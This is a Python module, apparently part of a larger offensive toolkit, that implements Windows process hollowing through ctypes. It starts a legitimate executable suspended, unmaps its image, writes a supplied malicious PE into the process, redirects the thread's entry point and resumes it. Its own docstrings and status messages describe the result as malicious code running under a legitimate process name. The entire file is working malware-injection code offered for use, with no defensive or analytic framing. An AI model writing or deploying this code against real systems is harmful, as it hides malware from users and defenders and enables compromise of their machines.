"""
Process Hollowing
Create legitimate process in suspended state, unmap original code, inject malicious code
"""

import os
import ctypes
import struct

from ..core.constants import (
    CREATE_SUSPENDED, CONTEXT_FULL, 
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
from ..core.structures import STARTUPINFO, PROCESS_INFORMATION, CONTEXT
from ..utils.helpers import parse_pe_header


class ProcessHollower:
    """
    Process Hollowing
    
    Creates a legitimate process, unmaps its memory, and injects malicious code
    """
    
    def __init__(self, kernel32, ntdll):
        """
        Initialize process hollower
        
        Args:
            kernel32: Windows kernel32.dll handle
            ntdll: Windows ntdll.dll handle
        """
        self.kernel32 = kernel32
        self.ntdll = ntdll
    
    def hollow(self, target_exe, payload_data):
        """
        Perform process hollowing
        
        Args:
            target_exe (str): Legitimate executable path
            payload_data (bytes): Malicious PE data to inject
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            print(f"[+] Target executable: {target_exe}")
            print(f"[+] Payload size: {len(payload_data)} bytes")
            
            # Create target process in suspended state
            pi = self._create_suspended_process(target_exe)
            
            if not pi:
                return False
            
            try:
                # Get process context
                context = self._get_thread_context(pi.hThread)
                
                if not context:
                    self.kernel32.TerminateProcess(pi.hProcess, 0)
                    return False
                
                # Read PEB to find image base
                image_base = self._read_image_base(pi.hProcess, context)
                
                if not image_base:
                    self.kernel32.TerminateProcess(pi.hProcess, 0)
                    return False
                
                # Unmap original executable
                print(f"[+] Unmapping original executable...")
                self.ntdll.NtUnmapViewOfSection(pi.hProcess, image_base)
                
                # Parse payload PE headers
                pe_info = parse_pe_header(payload_data)
                
                if not pe_info or not pe_info['is_valid']:
                    print(f"[!] Invalid PE file")
                    self.kernel32.TerminateProcess(pi.hProcess, 0)
                    return False
                
                print(f"[+] Payload image size: {pe_info['image_size']} bytes")
                print(f"[+] Entry point RVA: 0x{pe_info['entry_point_rva']:X}")
                
                # Allocate memory for payload
                payload_base = self._allocate_payload_memory(
                    pi.hProcess, 
                    image_base, 
                    pe_info['image_size']
                )
                
                if not payload_base:
                    self.kernel32.TerminateProcess(pi.hProcess, 0)
                    return False
                
                # Write payload to target process
                if not self._write_payload(pi.hProcess, payload_base, payload_data):
                    self.kernel32.TerminateProcess(pi.hProcess, 0)
                    return False
                
                # Update entry point
                if not self._update_entry_point(
                    pi.hThread, 
                    context, 
                    payload_base, 
                    pe_info['entry_point_rva']
                ):
                    self.kernel32.TerminateProcess(pi.hProcess, 0)
                    return False
                
                # Resume process
                print(f"[+] Resuming process...")
                self.kernel32.ResumeThread(pi.hThread)
                
                print(f"[+] Process hollowing complete")
                print(f"[+] Legitimate process name: {os.path.basename(target_exe)}")
                print(f"[+] Malicious code executing in memory")
                
                # Cleanup handles
                self.kernel32.CloseHandle(pi.hThread)
                self.kernel32.CloseHandle(pi.hProcess)
                
                return True
            
            except Exception as e:
                print(f"[-] Process hollowing error: {e}")
                self.kernel32.TerminateProcess(pi.hProcess, 0)
                self.kernel32.CloseHandle(pi.hThread)
                self.kernel32.CloseHandle(pi.hProcess)
                return False
        
        except Exception as e:
            print(f"[!] Process hollowing failed: {e}")
            return False
    
    def _create_suspended_process(self, target_exe):
        """
        Create process in suspended state
        
        Args:
            target_exe (str): Path to executable
            
        Returns:
            PROCESS_INFORMATION or None
        """
        print(f"[+] Creating suspended process...")
        
        si = STARTUPINFO()
        si.cb = ctypes.sizeof(STARTUPINFO)
        pi = PROCESS_INFORMATION()
        
        success = self.kernel32.CreateProcessW(
            target_exe,
            None,
            None,
            None,
            False,
            CREATE_SUSPENDED,
            None,
            None,
            ctypes.byref(si),
            ctypes.byref(pi)
        )
        
        if not success:
            print(f"[!] Failed to create process")
            return None
        
        print(f"[+] Process created (PID: {pi.dwProcessId})")
        print(f"[+] Process is suspended")
        
        return pi
    
    def _get_thread_context(self, h_thread):
        """
        Get thread context
        
        Args:
            h_thread: Thread handle
            
        Returns:
            CONTEXT or None
        """
        print(f"[+] Getting thread context...")
        
        context = CONTEXT()
        context.ContextFlags = CONTEXT_FULL
        
        result = self.kernel32.GetThreadContext(
            h_thread,
            ctypes.byref(context)
        )
        
        if not result:
            print(f"[!] GetThreadContext failed")
            return None
        
        return context
    
    def _read_image_base(self, h_process, context):
        """
        Read image base address from PEB
        
        Args:
            h_process: Process handle
            context: Thread context
            
        Returns:
            int: Image base address or None
        """
        print(f"[+] Reading PEB...")
        
        # RDX points to PEB on x64
        peb_address = context.Rdx
        image_base_offset = peb_address + 0x10  # ImageBaseAddress offset
        
        image_base = ctypes.c_ulonglong()
        result = self.kernel32.ReadProcessMemory(
            h_process,
            image_base_offset,
            ctypes.byref(image_base),
            8,
            None
        )
        
        if not result:
            print(f"[!] Failed to read image base")
            return None
        
        print(f"[+] Image base: 0x{image_base.value:X}")
        return image_base.value
    
    def _allocate_payload_memory(self, h_process, preferred_base, size):
        """
        Allocate memory for payload
        
        Args:
            h_process: Process handle
            preferred_base: Preferred base address
            size: Size to allocate
            
        Returns:
            int: Allocated address or None
        """
        print(f"[+] Allocating memory for payload...")
        
        payload_base = self.kernel32.VirtualAllocEx(
            h_process,
            preferred_base,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        
        if not payload_base:
            print(f"[!] VirtualAllocEx failed")
            return None
        
        print(f"[+] Allocated at: 0x{payload_base:X}")
        return payload_base
    
    def _write_payload(self, h_process, base_address, payload_data):
        """
        Write payload to process memory
        
        Args:
            h_process: Process handle
            base_address: Base address to write to
            payload_data: Payload bytes
            
        Returns:
            bool: True if successful
        """
        print(f"[+] Writing payload to target process...")
        
        written = ctypes.c_size_t(0)
        result = self.kernel32.WriteProcessMemory(
            h_process,
            base_address,
            payload_data,
            len(payload_data),
            ctypes.byref(written)
        )
        
        if not result:
            print(f"[!] WriteProcessMemory failed")
            return False
        
        print(f"[+] Wrote {written.value} bytes")
        return True
    
    def _update_entry_point(self, h_thread, context, base_address, entry_point_rva):
        """
        Update thread entry point
        
        Args:
            h_thread: Thread handle
            context: Thread context
            base_address: Payload base address
            entry_point_rva: Entry point RVA
            
        Returns:
            bool: True if successful
        """
        print(f"[+] Setting entry point...")
        
        context.Rcx = base_address + entry_point_rva
        
        result = self.kernel32.SetThreadContext(
            h_thread,
            ctypes.byref(context)
        )
        
        if not result:
            print(f"[!] SetThreadContext failed")
            return False
        
        return True